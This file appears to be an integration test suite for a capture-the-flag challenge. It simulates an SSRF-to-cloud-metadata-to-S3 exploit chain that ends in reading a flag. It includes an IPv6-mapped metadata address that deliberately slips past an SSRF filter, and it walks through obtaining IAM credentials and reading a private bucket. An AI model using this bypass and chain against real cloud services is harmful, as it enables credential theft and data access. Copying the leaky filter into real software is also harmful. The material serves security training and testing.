/**
 * Integration tests for SSRF → IMDS → S3 exploit chain
 */

import request from 'supertest';
import { createApp } from '../../src/index';
import { RealmConfig } from '../../src/config';

describe('SSRF Exploit Chain Integration', () => {
  let app: any;
  const testFlag = 'YGGDRASIL{ALFHEIM:test-integration-flag}';

  beforeAll(() => {
    const config: RealmConfig = {
      realmName: 'alfheim',
      port: 3002,
      flag: testFlag,
      nodeEnv: 'test',
    };
    app = createApp(config);
    // Don't start server in tests - supertest handles it
  });

  describe('Full 7-Step Exploit Chain', () => {
    let imdsToken: string;
    let credentials: any;

    it('Step 1: Should discover SSRF vulnerability via proxy endpoint', async () => {
      const response = await request(app)
        .get('/api/proxy/hints')
        .expect(200);

      expect(response.body.success).toBe(true);
      expect(response.body.hints).toBeDefined();
      expect(typeof response.body.hints).toBe('object');
      expect(Object.keys(response.body.hints).length).toBeGreaterThan(0);
    });

    it('Step 2: Should bypass IP filter using IPv6 notation', async () => {
      // Test that IPv6 bypass works
      const response = await request(app)
        .post('/api/proxy/test')
        .send({ url: 'http://[::ffff:169.254.169.254]/api/imds/token' })
        .expect(200);

      expect(response.body.blocked).toBe(false);
    });

    it('Step 3: Should generate IMDS token via SSRF (simulated)', async () => {
      // Direct call (simulating successful SSRF bypass)
      const response = await request(app)
        .put('/api/imds/token')
        .set('X-aws-ec2-metadata-token-ttl-seconds', '21600')
        .expect(200);

      expect(response.text).toBeDefined();
      expect(response.text.length).toBeGreaterThan(20);

      imdsToken = response.text;
    });

    it('Step 4: Should discover IAM role using token', async () => {
      expect(imdsToken).toBeDefined();

      const response = await request(app)
        .get('/api/imds/metadata/iam/role')
        .set('X-aws-ec2-metadata-token', imdsToken)
        .expect(200);

      expect(response.text).toBe('AlfheimAdminRole');
    });

    it('Step 5: Should retrieve IAM credentials containing flag', async () => {
      expect(imdsToken).toBeDefined();

      const response = await request(app)
        .get('/api/imds/metadata/iam/credentials?role=AlfheimAdminRole')
        .set('X-aws-ec2-metadata-token', imdsToken)
        .expect(200);

      expect(response.body.AccessKeyId).toMatch(/^AKIA/);
      expect(response.body.SecretAccessKey).toBeDefined();
      expect(response.body.Token).toBeDefined();
      expect(response.body.RealmAccessToken).toBe(testFlag);

      credentials = response.body;
    });

    it('Step 6: Should list private bucket with credentials', async () => {
      expect(credentials).toBeDefined();

      const response = await request(app)
        .get('/api/cloud/bucket/alfheim-secrets/objects')
        .query({
          accessKeyId: credentials.AccessKeyId,
          secretAccessKey: credentials.SecretAccessKey,
          token: credentials.Token,
        })
        .expect(200);

      expect(response.body.success).toBe(true);
      expect(response.body.objects).toContain('flag.txt');
    });

    it('Step 7: Should retrieve flag from private bucket', async () => {
      expect(credentials).toBeDefined();

      const response = await request(app)
        .get('/api/cloud/object/alfheim-secrets/flag.txt')
        .query({
          accessKeyId: credentials.AccessKeyId,
          secretAccessKey: credentials.SecretAccessKey,
          token: credentials.Token,
        })
        .expect(200);

      expect(response.body.success).toBe(true);
      expect(response.body.object.content).toBe(testFlag);
    });
  });

  describe('Access Control Validation', () => {
    it('Should deny access to private bucket without credentials', async () => {
      const response = await request(app)
        .get('/api/cloud/bucket/alfheim-secrets/objects')
        .expect(403);

      expect(response.body.success).toBe(false);
      expect(response.body.error).toContain('Access denied');
    });

    it('Should deny access to private object without credentials', async () => {
      const response = await request(app)
        .get('/api/cloud/object/alfheim-secrets/flag.txt')
        .expect(403);

      expect(response.body.success).toBe(false);
    });

    it('Should allow access to public bucket without credentials', async () => {
      const response = await request(app)
        .get('/api/cloud/bucket/user-documents/objects')
        .expect(200);

      expect(response.body.success).toBe(true);
      expect(response.body.objects).toBeDefined();
    });

    it('Should allow access to public object without credentials', async () => {
      const response = await request(app)
        .get('/api/cloud/object/user-documents/readme.md')
        .expect(200);

      expect(response.body.success).toBe(true);
      expect(response.body.object.content).toBeDefined();
    });
  });

  describe('IMDS Security', () => {
    it('Should require token for metadata access', async () => {
      const response = await request(app)
        .get('/api/imds/metadata/instance')
        .expect(401);

      expect(response.text).toContain('Token required');
    });

    it('Should reject invalid token', async () => {
      const response = await request(app)
        .get('/api/imds/metadata/instance')
        .set('X-aws-ec2-metadata-token', 'invalid-token')
        .expect(401);

      expect(response.text).toContain('Invalid or expired');
    });

    it('Should reject credentials request without token', async () => {
      const response = await request(app)
        .get('/api/imds/metadata/iam/credentials?role=AlfheimAdminRole')
        .expect(401);

      expect(response.text).toContain('Token required');
    });
  });

  describe('SSRF Filter Behavior', () => {
    it('Should block standard localhost URL', async () => {
      const response = await request(app)
        .post('/api/proxy/test')
        .send({ url: 'http://localhost/api' })
        .expect(200);

      expect(response.body.blocked).toBe(true);
    });

    it('Should block 127.0.0.1', async () => {
      const response = await request(app)
        .post('/api/proxy/test')
        .send({ url: 'http://127.0.0.1/api' })
        .expect(200);

      expect(response.body.blocked).toBe(true);
    });

    it('Should block metadata service IP directly', async () => {
      const response = await request(app)
        .post('/api/proxy/test')
        .send({ url: 'http://169.254.169.254/latest' })
        .expect(200);

      expect(response.body.blocked).toBe(true);
    });

    it('Should block hex encoding (node parser normalizes it)', async () => {
      const response = await request(app)
        .post('/api/proxy/test')
        .send({ url: 'http://0x7f.0x0.0x0.0x1/api' })
        .expect(200);

      expect(response.body.blocked).toBe(true);
    });

    it('Should allow bypass with IPv6 notation', async () => {
      const response = await request(app)
        .post('/api/proxy/test')
        .send({ url: 'http://[::ffff:169.254.169.254]/api' })
        .expect(200);

      expect(response.body.blocked).toBe(false);
    });
  });

  describe('Bucket Enumeration', () => {
    it('Should list all buckets (public and private)', async () => {
      const response = await request(app)
        .get('/api/cloud/buckets')
        .expect(200);

      expect(response.body.success).toBe(true);
      expect(response.body.buckets.length).toBeGreaterThan(0);

      const bucketNames = response.body.buckets.map((b: any) => b.name);
      expect(bucketNames).toContain('user-documents');
      expect(bucketNames).toContain('alfheim-secrets');
    });

    it('Should indicate bucket visibility status', async () => {
      const response = await request(app)
        .get('/api/cloud/buckets')
        .expect(200);

      const secretsBucket = response.body.buckets.find((b: any) => b.name === 'alfheim-secrets');
      expect(secretsBucket.public).toBe(false);

      const docsBucket = response.body.buckets.find((b: any) => b.name === 'user-documents');
      expect(docsBucket.public).toBe(true);
    });
  });

  describe('Credential Format Validation', () => {
    it('Should accept credentials from IMDS', async () => {
      // Must use actual IMDS credentials
      const tokenRes = await request(app)
        .put('/api/imds/token')
        .set('X-aws-ec2-metadata-token-ttl-seconds', '21600');
      
      const token = tokenRes.text;
      
      const credsRes = await request(app)
        .get('/api/imds/metadata/iam/credentials?role=AlfheimAdminRole')
        .set('X-aws-ec2-metadata-token', token);
      
      const creds = credsRes.body;

      const response = await request(app)
        .get('/api/cloud/bucket/alfheim-secrets/objects')
        .query({
          accessKeyId: creds.AccessKeyId,
          secretAccessKey: creds.SecretAccessKey,
          token: creds.Token,
        })
        .expect(200);

      expect(response.body.success).toBe(true);
    });

    it('Should reject credentials without AKIA prefix', async () => {
      const mockCreds = {
        AccessKeyId: 'INVALID_KEY_ID',
        SecretAccessKey: 'test-secret',
        Token: 'test-token',
      };

      const response = await request(app)
        .get('/api/cloud/bucket/alfheim-secrets/objects')
        .query(mockCreds)
        .expect(403);

      expect(response.body.success).toBe(false);
    });
  });
});
